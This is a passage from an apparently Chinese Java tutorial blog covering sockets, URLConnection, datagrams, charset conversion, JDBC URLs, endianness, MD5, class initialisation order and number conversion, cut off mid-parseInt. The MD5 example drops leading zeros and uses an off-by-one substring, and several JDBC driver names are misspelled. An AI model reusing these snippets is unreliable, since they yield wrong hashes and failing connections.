<p><img src="/images/java/javanet7p.png"></p>
<h2 id="JAVA网络通信过程"><a href="#JAVA网络通信过程" class="headerlink" title="JAVA网络通信过程"></a>JAVA网络通信过程</h2><p><img src="http://iteedu.com/images/java/javasocket.png">\</p>
<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>构造函数</p>
<pre><code>Socket()
Socket(InetAddress address, int port)throws UnknownHostException, IOException
Socket(InetAddress address, int port, InetAddress localAddress, int localPort)throws IOException
Socket(String host, int port)throws UnknownHostException, IOException
Socket(String host, int port, InetAddress localAddress, int localPort)throws IOException
</code></pre>
<p>除去第一种不带参数的之外，其它构造函数会尝试建立与服务器的连接。如果失败会抛出IOException错误。如果成功，则返回Socket对象。</p>
<p>InetAddress是一个用于记录主机的类，其静态getHostByName(String<br>msg)可以返回一个实例，其静态方法getLocalHost()也可以获得当前主机的IP地址，并返回一个实例。</p>
<p>Socket(String host, int port, InetAddress localAddress, int<br>localPort)构造函数的参数分别为目标IP、目标端口、绑定本地IP、绑定本地端口。</p>
<p>主要方法：</p>
<pre><code>getInetAddress();    //远程服务端的IP地址
getPort();    　　　//远程服务端的端口
getLocalAddress()   //本地客户端的IP地址
getLocalPort()    　//本地客户端的端口
getInputStream();   //获得输入流
getOutStream();    //获得输出流
isClosed(); //连接是否已关闭，若关闭，返回true；否则返回false
isConnect();　　//如果曾经连接过，返回true；否则返回false
isBound();  //如果Socket已经与本地一个端口绑定，返回true；否则返回false
</code></pre>
<h2 id="ServerSocket"><a href="#ServerSocket" class="headerlink" title="ServerSocket"></a>ServerSocket</h2><p>构造函数</p>
<pre><code>ServerSocket()throws IOException
ServerSocket(int port)throws IOException
ServerSocket(int port, int backlog)throws IOException
ServerSocket(int port, int backlog, InetAddress bindAddr)throws IOException
</code></pre>
<p>注意点：</p>
<p>1.port服务端要监听的端口；backlog客户端连接请求的队列长度；bindAddr服务端绑定IP</p>
<p>2.如果端口被占用或者没有权限使用某些端口会抛出BindException错误。譬如1~1023的端口需要管理员才拥有权限绑定。</p>
<p>3. 如果设置端口为0，则系统会自动为其分配一个端口；</p>
<p>4.bindAddr用于绑定服务器IP，为什么会有这样的设置呢，譬如有些机器有多个网卡。</p>
<p>5.ServerSocket一旦绑定了监听端口，就无法更改。ServerSocket()可以实现在绑定端口前设置其他的参数。</p>
<p>多线程的ServerSocket示例：</p>
<pre><code>public void service()&#123;
    while(true)&#123;
        Socket socket=null;
        try&#123;
            socket=serverSocket.accept();    //主线程获取客户端连接
            Thread workThread=new Thread(new Handler(socket)); //创建线程
            workThread.start();  //启动线程
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

class Handler implements Runnable&#123;
    private Socket socket;
    public Handler(Socket socket)&#123;
        this.socket=socket;
    &#125;
    
    public void run()&#123;
        try&#123;
            System.out.println(&quot;新连接:&quot;+socket.getInetAddress()+&quot;:&quot;+socket.getPort());
            Thread.sleep(10000);
        &#125;catch(Exception e)&#123;e.printStackTrace();&#125;finally&#123;
            try&#123;
                System.out.println(&quot;关闭连接:&quot;+socket.getInetAddress()+&quot;:&quot;+socket.getPort());
                if(socket!=null)socket.close();
            &#125;catch(IOException e)&#123;
                e.printStackTrace();
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="URL对象示例"><a href="#URL对象示例" class="headerlink" title="URL对象示例"></a>URL对象示例</h2><pre><code>URL url = new URL(&quot;http://www.cnblogs.com/linjiqin/&quot;);
BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
String inputLine;
while ((inputLine = in.readLine()) != null) &#123;
System.out.println(inputLine);
&#125;
in.close();
</code></pre>
<h2 id="URLConnection示例"><a href="#URLConnection示例" class="headerlink" title="URLConnection示例"></a>URLConnection示例</h2><p>通过URL的方法openStream()，我们只能从网络上读取数据，如果我们同时还想输出数据，例如向服务器端的CGI程序发送一些数据，我们必须先与URL建立连接，然后才能对其进行读写，这时就要用到类URLConnection了。</p>
<pre><code>//创建URL对象
URL url=new URL(&quot;http://www.javasoft.com/cgi-bin/backwards&quot;);
//由URL对象获取URLConnection对象
URLConnection conn=url.openConnection();
//由URLConnection获取输入流，并构造DataInputStream对象
DataInputStream dis=new DataInputStream(conn.getInputStream()); 
//由URLConnection获取输出流，并构造PrintStream对象
PrintStream ps=new PrintStream(conn.getOutputStream());
String line=dis.readLine(); 
ps.println(&quot;client…&quot;); //向服务器写出字符串 &quot;client…&quot;
</code></pre>
<h2 id="DatagramSocket"><a href="#DatagramSocket" class="headerlink" title="DatagramSocket"></a>DatagramSocket</h2><p>DatagramSocket具有的主要方法如下：</p>
<p>receive(DatagramPacket<br>d)：接收数据报文到d中。receive方法产生一个”阻塞”。”阻塞”是一个专业名词，它会产生一个内部循环，使程序暂停在这个地方，直到一个条件触发。</p>
<p>send(DatagramPacket dp)：发送报文dp到目的地。</p>
<p>setSoTimeout(int timeout)：设置超时时间，单位为毫秒。</p>
<p>close()：关闭DatagramSocket。在应用程序退出的时候，通常会主动释放资源，关闭Socket，但是由于异常地退出可能造成资源无法回收。所以，应该在程序完成时，主动使用此方法关闭Socket，或在捕获到异常抛出后关闭Socket。</p>
<pre><code>DatagramSocket  server = new DatagramSocket(5050);
</code></pre>
<h2 id="DatagramPacket"><a href="#DatagramPacket" class="headerlink" title="DatagramPacket"></a>DatagramPacket</h2><p>用于处理报文，它将Byte数组、目标地址、目标端口等数据包装成报文或者将报文拆卸成Byte数组。应用程序在产生数据包是应该注意，TCP&#x2F;IP规定数据报文大小最多包含65507个，通常主机接收548个字节，但大多数平台能够支持8192字节大小的报文。</p>
<p>DatagramPacket类的构建器共有4个：</p>
<p>DatagramPacket(byte[] buf, int<br>length)：将数据包中Length长的数据装进Buf数组，一般用来接收客户端发送的数据。</p>
<p>DatagramPacket(byte[] buf, int offset, int<br>length)：将数据包中从Offset开始、Length长的数据装进Buf数组。</p>
<p>DatagramPacket(byte[] buf, int length, InetAddress clientAddress, int<br>clientPort)：从Buf数组中，取出Length长的数据创建数据包对象，目标是clientAddress地址，clientPort端口,通常用来发送数据给客户端。</p>
<p>DatagramPacket(byte[] buf, int offset, int length, InetAddress<br>clientAddress, int<br>clientPort)：从Buf数组中，取出Offset开始的、Length长的数据创建数据包对象，目标是clientAddress地址，clientPort端口，通常用来发送数据给客户端。</p>
<p>主要的方法如下：</p>
<p>getData(): 从实例中取得报文的Byte数组编码。</p>
<p>setDate(byte[] buf)：将byte数组放入要发送的报文中。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA字符串转码String.getBytes()和new String()</title>
    <url>/blog/plang/java/base/javastring/</url>
    <content><![CDATA[<p>在Java中，String.getBytes(String decode)方法会根据指定的decode编码返回某字符串在该编码下的byte数组表示，如</p>
<pre><code>byte[] b_gbk = &quot;中&quot;.getBytes(&quot;GBK&quot;);
byte[] b_utf8 = &quot;中&quot;.getBytes(&quot;UTF-8&quot;);
byte[] b_iso88591 = &quot;中&quot;.getBytes(&quot;ISO8859-1&quot;);
</code></pre>
<p>将分别返回“中”这个汉字在GBK、UTF-8和ISO8859-1编码下的byte数组表示，此时b_gbk的长度为2，b_utf8的长度为3，b_iso88591的长度为1。</p>
<p>而与getBytes相对的，可以通过new String(byte[], decode)的方式来还原这个“中”字时，这个new String(byte[], decode)实际是使用decode指定的编码来将byte[]解析成字符串。</p>
<pre><code>String s_gbk = new String(b_gbk,&quot;GBK&quot;);
String s_utf8 = new String(b_utf8,&quot;UTF-8&quot;);
String s_iso88591 = new String(b_iso88591,&quot;ISO8859-1&quot;);
</code></pre>
<p>通过打印s_gbk、s_utf8和s_iso88591，会发现，s_gbk和s_utf8都是“中”，而只有s_iso88591是一个不认识 的字符，为什么使用ISO8859-1编码再组合之后，无法还原“中”字呢，其实原因很简单，因为ISO8859-1编码的编码表中，根本就没有包含汉字 字符，当然也就无法通过”中”.getBytes(“ISO8859-1”);来得到正确的“中”字在ISO8859-1中的编码值了，所以再通过new String()来还原就无从谈起了。</p>
<p>因此，通过String.getBytes(String decode)方法来得到byte[]时，一定要确定decode的编码表中确实存在String表示的码值，这样得到的byte[]数组才能正确被还原。</p>
<p>有时候，为了让中文字符适应某些特殊要求（如http header头要求其内容必须为iso8859-1编码），可能会通过将中文字符按照字节方式来编码的情况，如</p>
<pre><code>String s_iso88591 = new String(&quot;中&quot;.getBytes(&quot;UTF-8&quot;),&quot;ISO8859-1&quot;)
</code></pre>
<p>这样得到的s_iso8859-1字符串实际是三个在 ISO8859-1中的字符，在将这些字符传递到目的地后，目的地程序再通过相反的方式</p>
<pre><code>String s_utf8 = new String(s_iso88591.getBytes(&quot;ISO8859-1&quot;),&quot;UTF-8&quot;)
</code></pre>
<p>来得到正确的中文汉字“中”。这样就既保证了遵守协 议规定、也支持中文。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>字符编码</tag>
      </tags>
  </entry>
  <entry>
    <title>jdbc-driver-url 各数据库jdbc驱动和链接类型</title>
    <url>/blog/plang/java/base/jdbcurl/</url>
    <content><![CDATA[<p>MySQL:<br>Com.mysql.jdbc.Driver<br>Jdbc:<br>mysql:&#x2F;&#x2F;ip:port&#x2F;dbname</p>
<p><br>MS SQL Server 2000<br>Com.microsoft.jdbc.sqlserver.SQLDerverDriver<br>Jdbc:<br>Microsoft:sqlserver:&#x2F;&#x2F;ip:port&#x2F;DatabaseName&#x3D;dbname\</p>
<p> Oracle<br>Oracle.jdbc.driver.OracleDriver<br>Jdbc:<br>oracle:thin:@ip:port:DB_name,user,pwd</p>
<p>Sybase<br>Com.sybase.jdbc2.jdbc.SybDriver<br>Jdbc:<br>Sybase:Tds:ip:port&#x2F;DB_name\</p>
<p>JDBC-ODBC<br>Sun,jdbc,odbc.JdbcOdbcDriber<br>Jdbc:<br>odbc:[odbcsource]</p>
<p><br>连接方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.forName(Driver_Name); </span><br><span class="line">Connection con=DriverManager.getConnection(url,user,password);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>判断JVM是大端还是小端</title>
    <url>/blog/plang/java/base/jvmddxd/</url>
    <content><![CDATA[<p>字节数组转为整形</p>
<pre><code>import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;

public class Test
&#123;
    /**
     * 将字节数组（byte[]）转为整形(int)
     */
    public static void main(String[] args) throws IOException
    &#123;
        byte[] byteAr = new byte[]&#123;0x78,0x56,0x34,0x12&#125;;
        ByteArrayInputStream bais = new ByteArrayInputStream(byteAr);
        DataInputStream dis = new DataInputStream(bais);
        System.out.println(Integer.toHexString(dis.readInt()));
    &#125;
&#125;
// output: 78563412
</code></pre>
<p>结论：说明 JVM 是大端</p>
<p>整形转为字节数组</p>
<pre><code>import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class Test
&#123;
    public static void main(String[] args) throws IOException
    &#123;
        /**
         * 将整形(int)转为字节数组（byte[]）
         */
        int a = 0x12345678;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        dos.writeInt(a);
        byte[] b = baos.toByteArray();
        for(int i = 3; i &gt;= 0; i--)
        &#123;
            System.out.print(Integer.toHexString(b[i]));
        &#125;
        System.out.println();
    &#125;
&#125;
// Output: 78563412
</code></pre>
<p>结论：说明 JVM 是大端</p>
<h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>端模式（Endian）的这个词出自Jonathan Swift书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，从圆头开始将鸡蛋敲开的人被归为Big Endian，从尖头开始将鸡蛋敲开的人被归为Littile Endian。小人国的内战就源于吃鸡蛋时是究竟从大头（Big-Endian）敲开还是从小头（Little-Endian）敲开。在计算机业Big Endian和Little Endian也几乎引起一场战争。在计算机业界，Endian表示数据在存储器中的存放顺序。下文举例说明在计算机中大小端模式的区别。</p>
<p>如果将一个32位的整数0x12345678存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。为简单起见，本书使用OP0表示一个32位数据的最高字节MSB（Most Significant Byte），使用OP3表示一个32位数据最低字节LSB（Least Significant Byte）。</p>
<table>
<thead>
<tr>
<th>地址偏移</th>
<th>大端模式</th>
<th>小端模式</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>12（OP0）</td>
<td>78（OP3）</td>
</tr>
<tr>
<td>0x01</td>
<td>34（OP1）</td>
<td>56（OP2）</td>
</tr>
<tr>
<td>0x02</td>
<td>56（OP2）</td>
<td>34（OP1）</td>
</tr>
<tr>
<td>0x03</td>
<td>78（OP3）</td>
<td>12（OP0）</td>
</tr>
</tbody></table>
<p>由上表所知，采用大小模式对数据进行存放的主要区别在于在存放的字节顺序，大端方式将高位存放在低地址，小端方式将高位存放在高地址。采用大端方式进行数据存放符合人类的正常思维，而采用小端方式进行数据存放利于计算机处理。到目前为止，采用大端或者小端进行数据存放，其孰优孰劣也没有定论。</p>
<p>有的处理器系统采用了小端方式进行数据存放，如Intel的奔腾。有的处理器系统采用了大端方式进行数据存放，如IBM半导体和Freescale的PowerPC处理器。不仅对于处理器，一些外设的设计中也存在着使用大端或者小端进行数据存放的选择。</p>
<p>因此在一个处理器系统中，有可能存在大端和小端模式同时存在的现象。这一现象为系统的软硬件设计带来了不小的麻烦，这要求系统设计工程师，必须深入理解大端和小端模式的差别。大端与小端模式的差别体现在一个处理器的寄存器，指令集，系统总线等各个层次中。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA之用MessageDigest进行MD5加密</title>
    <url>/blog/plang/java/base/md5/</url>
    <content><![CDATA[<p>用JAVA生成32位和16位MD5值。</p>
<p>其实16位的是取的32位的中间的一段。</p>
<pre><code>import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MD5Test &#123;
    public static void main(String[] args) throws NoSuchAlgorithmException &#123;
        String str = &quot;123456&quot;;
        MessageDigest md = MessageDigest.getInstance(&quot;md5&quot;);
        String md32 = convertToHexString(md.digest(str.getBytes()));
        System.out.println(&quot;md32:&quot; + md32);
        System.out.println(&quot;md16:&quot; + md32.substring(7, 23));
    &#125;

    static String convertToHexString(byte data[]) &#123;
        StringBuffer strBuffer = new StringBuffer();
        for (int i = 0; i &lt; data.length; i++) &#123;
            strBuffer.append(Integer.toHexString(0xff &amp; data[i]));
        &#125;
        return strBuffer.toString();
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>放倒一片的JAVA基础面试题</title>
    <url>/blog/plang/java/base/mstneworder/</url>
    <content><![CDATA[<pre><code>public class Child extends Father&#123;
    
    static &#123;
        System.out.println(&quot;child--&gt;static&quot;);
    &#125;
    
    private int n = 20;
    
    &#123;
        n = 30;
    &#125;
    
    public int x = 200;
    
    public Child() &#123;
        this(&quot;The other constructor&quot;);
        System.out.println(&quot;child constructor body: &quot; + n);
    &#125;
    
    public Child(String s) &#123;
        System.out.println(s);
    &#125;
    
    public void age() &#123;
        System.out.println(&quot;age=&quot; + n);
    &#125;
    
    public void printX() &#123;
        System.out.println(&quot;x=&quot; + x);
    &#125;
    
    public static void main(String[] args) &#123;
        new Child().printX();
    &#125;
&#125;

class Father &#123;
    
    static &#123;
        System.out.println(&quot;super--&gt;static&quot;);
    &#125;
    
    public static int n = 10;
    public int x = 100;
    
    public Father() &#123;
        System.out.println(&quot;super&#39;s x=&quot; + x);
        age();
    &#125;
    
    public void age()&#123;
        System.out.println(&quot;nothing&quot;);
    &#125;
&#125;
</code></pre>
<p>(1).Child的main(...)方法内的new语句会触发JVM对类的加载。因为Child是继承自Father的，所以会先加载Father.class.加载过程会执行两步：</p>
<p>(a).所有的static数据域初始化为默认值(0,false,null)，所以Father内的static的n首先默认值为0.</p>
<p>(b).执行所有的static域的初始化语句或者初始化块（按出现的顺序），此时Father内static块的打印语句执行：super--&gt;static，并且static的n赋值语句n<br>&#x3D; 10执行。</p>
<p>父类的方法表建立后算是父类加载完毕，接着会加载子类Child，执行的过程与父类类似。因为子类没有static的数据域，所以仅仅static的初始化块内的打印语句执行：child--&gt;static。</p>
<p>这也解释了为什么static的初始化只有一次，因为它仅仅在类加载的时候执行而与实例化没有关系。</p>
<p>(2).需要的类加载完毕之后new<br>Child()开始使用类构造器创建实例。我理解的构造器的执行有以下几步：</p>
<p>(a)所有数据域初始化为默认值(0,false,null)。</p>
<p>(b)如果有父类则先执行父类的构造器。</p>
<p>(c)按声明出现的顺序执行所有数据域的初始化语句或者初始化块</p>
<p>(d)如果构造器主体的第一句调用了另一个构造器，则执行第二个构造器的主体（非super）</p>
<p>(e)执行构造器的主体部分</p>
<p>现在对号入座看看此例的情况，首先Child的数据域初始化为默认值：n&#x3D;0,<br>x&#x3D;0.接着由于继承Father如果没有在构造器主体显示使用super(...)调用Father有参或者无参的构造器，则隐式的去调用无参的构造器。此时开始了Father构造器的执行过程：</p>
<p>首先Father的所有数据域初始化为默认值：x&#x3D;0；接着是Father的父类Object的构造器执行；完毕后Fahter开始数据域的初始化语句的执行：x&#x3D;100；Father构造器主体没有调用自身的其他的构造器，第四步跳过；最后一步就是Father构造器的主体：先执行打印super&#39;s<br>x&#x3D;100，接着调用age().这里Father和Child的方法表内都有age()方法，但是因为要创建的是Child实例，所以JVM会动态的绑定到Child的age()方法，所以执行了System.out.println(&quot;age&#x3D;&quot;</p>
<ul>
<li>n);而此时n仅仅是默认值0，所以打印age&#x3D;0.</li>
</ul>
<p>父类的构造器调用完毕之后，继续Child构造器执行的第三步：数据域的初始化语句和初始化块，此时按照声明的顺序n&#x3D;20，接着在初始化块中n&#x3D;30，然后就是x&#x3D;200；Child的第四步满足条件，所以会执行Child(String<br>s)有参构造器的主体，打印The other<br>constructor；最后一步执行本构造器的主体，打印child constructor body:<br>30。</p>
<p>至此实例化完毕，main函数内调用了实例的printX()方法执行System.out.println(&quot;x&#x3D;&quot;+x)语句。这里虽然Father和Child都有public的x。但是由于语句内没有显示使用super.x，则会隐式的使用this.x。这样打印x&#x3D;200.完整的执行结果如下：</p>
<pre><code>super--&gt;static 
child--&gt;static 
super&#39;s x=100 
age=0 
The other constructor 
child constructor body: 30 
x=200
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】JAVA的命名空间</title>
    <url>/blog/plang/java/base/namespace/</url>
    <content><![CDATA[<p>先来看一段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Object o=new C();</span><br><span class="line">		System.out.println(((C)o).name);</span><br><span class="line">		System.out.println(((B)o).name);</span><br><span class="line">		System.out.println(((A)o).name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	String name=&quot;this is A&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends A&#123;</span><br><span class="line">	String name=&quot;this is B&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C extends B&#123;</span><br><span class="line">	String name=&quot;this is C&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is C</span><br><span class="line">this is B</span><br><span class="line">this is A</span><br></pre></td></tr></table></figure>

<p>我们知道，同一个命名空间（作用域）是不能有同一个名字的。</p>
<p>JAVA和python、javascritpt这些语言不一样，构造器会从父类一直执行到子类。</p>
<p>从上面的代码看出，在继承链上的每个类都有自己的命名空间，也就是一个java对象是一串空间，python的是一个空间。</p>
<p>再看一下方法的命名空间：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Object o=new C();</span><br><span class="line">		((C)o).print();</span><br><span class="line">		((B)o).print();</span><br><span class="line">		((A)o).print();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	String name=&quot;this is A&quot;;</span><br><span class="line">	public void print() &#123;</span><br><span class="line">		System.out.println(name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends A&#123;</span><br><span class="line">	String name=&quot;this is B&quot;;</span><br><span class="line">	public void print() &#123;</span><br><span class="line">		System.out.println(name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C extends B&#123;</span><br><span class="line">	String name=&quot;this is C&quot;;</span><br><span class="line">	public void print() &#123;</span><br><span class="line">		System.out.println(name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is C</span><br><span class="line">this is C</span><br><span class="line">this is C</span><br></pre></td></tr></table></figure>

<p>可见，通过实例访问父类被覆盖的方法是行不通的，我想到的只能是通过反射。</p>
<p>类是方法的命名空间，方法的查找都是从子类向上查找的，所以直接访问父类的是行不通的。</p>
<p>JAVA实例命名空间是个串，类的命名空间也是个串，实例命名空间是构造器执行是创建的，类命名空间是类加载时创建的。</p>
<p>实例可以调用类命名空间的方法是因为实例和类空间有关联，可以看看其它语言的apply方法，本质上都是过程式的调用。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA 把一个数字转换成字符</title>
    <url>/blog/plang/java/base/numtochar/</url>
    <content><![CDATA[<p>主要思想：在ASSIC码表中数字的码是连接的，所以digit +<br>&#39;0&#39;代表就是digit对应字符的ASSIC码。当digit大于9时就要用字母来表示了就有了digit</p>
<ul>
<li>&#39;a&#39; - 10。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static char forDigit(int digit, int radix) &#123;</span><br><span class="line">    if (MIN_RADIX &lt;= radix &amp;&amp; radix &lt;= MAX_RADIX) &#123;</span><br><span class="line">        if (0 &lt;= digit &amp;&amp; digit &lt; radix) &#123;</span><br><span class="line">            return (char) (digit &lt; 10 ? digit + &#x27;0&#x27; : digit + &#x27;a&#x27; - 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA把数字转换为字符串</title>
    <url>/blog/plang/java/base/numtostring/</url>
    <content><![CDATA[<p>转换为二进制字符串：</p>
<p>[i &gt;&gt;&gt;&#x3D; 1]{.code}是将i右移一二进制位，这样就去除了最低一位。[i &amp;<br>1]{.code}是位的与运算，会得到最低二进制位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String toBinaryString(int i) &#123;</span><br><span class="line">    int bufLen = 32;  // Max number of binary digits in an int</span><br><span class="line">    char[] buf = new char[bufLen];</span><br><span class="line">    int cursor = bufLen;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        buf[--cursor] = (char) ((i &amp; 1) + &#x27;0&#x27;);</span><br><span class="line">    &#125;  while ((i &gt;&gt;&gt;= 1) != 0);</span><br><span class="line"></span><br><span class="line">    return new String(cursor, bufLen - cursor, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换为十六进制字符串：</p>
<p>DIGITS[i &amp; 0xF]也可以用<a href="/plang/java/numtochar.php">forDigit(int digit, int<br>radix)</a>转换为字符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final char[] DIGITS = &#123;</span><br><span class="line">    &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;,</span><br><span class="line">    &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;,</span><br><span class="line">    &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;,</span><br><span class="line">    &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;</span><br><span class="line">&#125;;</span><br><span class="line">public static String toHexString(int i) &#123;</span><br><span class="line">    int bufLen = 8;  // Max number of hex digits in an int</span><br><span class="line">    char[] buf = new char[bufLen];</span><br><span class="line">    int cursor = bufLen;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        buf[--cursor] = DIGITS[i &amp; 0xF];</span><br><span class="line">    &#125; while ((i &gt;&gt;&gt;= 4) != 0);</span><br><span class="line"></span><br><span class="line">    return new String(cursor, bufLen - cursor, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换为八进制字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String toOctalString(int i) &#123;</span><br><span class="line">    int bufLen = 11;  // Max number of octal digits in an int</span><br><span class="line">    char[] buf = new char[bufLen];</span><br><span class="line">    int cursor = bufLen;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        buf[--cursor] = (char) ((i &amp; 7) + &#x27;0&#x27;);</span><br><span class="line">    &#125; while ((i &gt;&gt;&gt;= 3) != 0);</span><br><span class="line"></span><br><span class="line">    return new String(cursor, bufLen - cursor, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>任意进制转换为字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String toString(int i, int radix) &#123;</span><br><span class="line">    if (radix &lt; Character.MIN_RADIX || radix &gt; Character.MAX_RADIX) &#123;</span><br><span class="line">        radix = 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    boolean negative = false;</span><br><span class="line">    if (i &lt; 0) &#123;</span><br><span class="line">        negative = true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        i = -i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int bufLen = radix &lt; 8 ? 33 : 12;  </span><br><span class="line">    char[] buf = new char[bufLen];</span><br><span class="line">    int cursor = bufLen;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        int q = i / radix;</span><br><span class="line">        buf[--cursor] = DIGITS[radix * q - i];</span><br><span class="line">        i = q;</span><br><span class="line">    &#125; while (i != 0);</span><br><span class="line"></span><br><span class="line">    if (negative) &#123;</span><br><span class="line">        buf[--cursor] = &#x27;-&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return new String(cursor, bufLen - cursor, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA parseInt(String)字符串转整数</title>
    <url>/blog/plang/java/base/parseint/</url>
    <content><![CDATA[<p>主要看如何处理正负号和循环处理字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static int parseInt(String string) throws NumberFormatException &#123;</span><br><span class="line">    return parseInt(string, 10);</span><br><span class="line">&#125;</span><br><span class="line">public static int parseInt(String string, int radix)</span><br><span class="line">        throws NumberFormatException &#123;</span><br><span class="line">    if (string == null || radix &lt; Character.MIN_RADIX</span><br><span class="line">            || radix &gt; Character.MAX_RADIX) &#123;</span><br><span class="line">        // BEGIN android-changed</span><br><span class="line">        throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">        // END android-changed</span><br><span class="line">    &#125;</span><br><span class="line">    int length = string.length(), i = 0;</span><br><span class="line">    if (length == 0) &#123;</span><br><span class="line">        // BEGIN android-changed</span><br><span class="line">        throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">        // END android-changed</span><br><span class="line">    &#125;</span><br><span class="line">    boolean negative = string.charAt(i) == &#x27;-&#x27;;</span><br><span class="line">    if (negative &amp;&amp; ++i == length) &#123;</span><br><span class="line">        // BEGIN 